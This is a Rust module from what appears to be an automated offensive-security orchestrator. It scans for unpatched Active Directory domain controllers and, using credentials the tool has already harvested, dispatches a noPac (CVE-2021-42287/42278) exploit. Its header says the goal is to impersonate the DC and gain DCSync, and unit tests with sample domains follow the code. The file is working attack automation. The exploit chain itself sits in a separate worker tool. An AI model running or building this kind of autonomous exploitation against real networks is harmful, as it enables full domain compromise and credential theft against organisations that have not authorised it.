//! auto_nopac -- exploit CVE-2021-42287/CVE-2021-42278 (noPac / SamAccountName
//! spoofing) when conditions are met.
//!
//! noPac creates a computer account, renames it to match a DC, requests a TGT,
//! then restores the name. The TGT now impersonates the DC, enabling DCSync.
//! Requires: valid domain credentials, MAQ > 0 (default 10), unpatched DCs.
//!
//! The worker has a `nopac` tool that wraps the full chain.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Monitors for noPac exploitation opportunities.
/// Dispatches against each DC+credential pair once.
/// Interval: 45s (low-priority CVE check).
pub async fn auto_nopac(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("nopac") {
            continue;
        }

        let work: Vec<NopacWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for (domain, dc_ip) in &state.domain_controllers {
                // Skip domains we already dominate — noPac is pointless if we have krbtgt
                if state.dominated_domains.contains(&domain.to_lowercase()) {
                    continue;
                }

                // Find a credential for this domain
                let cred = match state
                    .credentials
                    .iter()
                    .find(|c| c.domain.to_lowercase() == domain.to_lowercase())
                {
                    Some(c) => c.clone(),
                    None => continue,
                };

                let dedup_key = format!("nopac:{}:{}", domain.to_lowercase(), dc_ip);
                if state.is_processed(DEDUP_NOPAC, &dedup_key) {
                    continue;
                }

                items.push(NopacWork {
                    dedup_key,
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "nopac",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("nopac");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        dc = %item.dc_ip,
                        domain = %item.domain,
                        "noPac (CVE-2021-42287) exploitation dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_NOPAC, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_NOPAC, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(dc = %item.dc_ip, "noPac task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, dc = %item.dc_ip, "Failed to dispatch noPac");
                }
            }
        }
    }
}

struct NopacWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("nopac:{}:{}", "contoso.local", "192.168.58.10");
        assert_eq!(key, "nopac:contoso.local:192.168.58.10");
    }

    #[test]
    fn dedup_key_normalizes_domain() {
        let key = format!(
            "nopac:{}:{}",
            "CONTOSO.LOCAL".to_lowercase(),
            "192.168.58.10"
        );
        assert_eq!(key, "nopac:contoso.local:192.168.58.10");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_NOPAC, "nopac");
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "nopac",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "nopac");
        assert_eq!(payload["target_ip"], "192.168.58.10");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "testuser".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = NopacWork {
            dedup_key: "nopac:contoso.local:192.168.58.10".into(),
            domain: "contoso.local".into(),
            dc_ip: "192.168.58.10".into(),
            credential: cred,
        };

        assert_eq!(work.dedup_key, "nopac:contoso.local:192.168.58.10");
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.dc_ip, "192.168.58.10");
        assert_eq!(work.credential.username, "testuser");
    }

    #[test]
    fn dedup_key_case_normalization() {
        let domain = "CONTOSO.LOCAL";
        let dc_ip = "192.168.58.10";
        let key = format!("nopac:{}:{}", domain.to_lowercase(), dc_ip);
        assert_eq!(key, "nopac:contoso.local:192.168.58.10");

        let domain2 = "Fabrikam.Local";
        let key2 = format!("nopac:{}:{}", domain2.to_lowercase(), "192.168.58.20");
        assert_eq!(key2, "nopac:fabrikam.local:192.168.58.20");
    }

    #[test]
    fn domain_matching_for_credential_selection() {
        let cred_contoso = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let cred_fabrikam = ares_core::models::Credential {
            id: "c2".into(),
            username: "fabadmin".into(),
            password: "FabPass!".into(), // pragma: allowlist secret
            domain: "fabrikam.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let creds = [cred_contoso, cred_fabrikam];
        let target_domain = "fabrikam.local";

        let matched = creds
            .iter()
            .find(|c| c.domain.to_lowercase() == target_domain.to_lowercase());
        assert!(matched.is_some());
        assert_eq!(matched.unwrap().username, "fabadmin");
    }
}
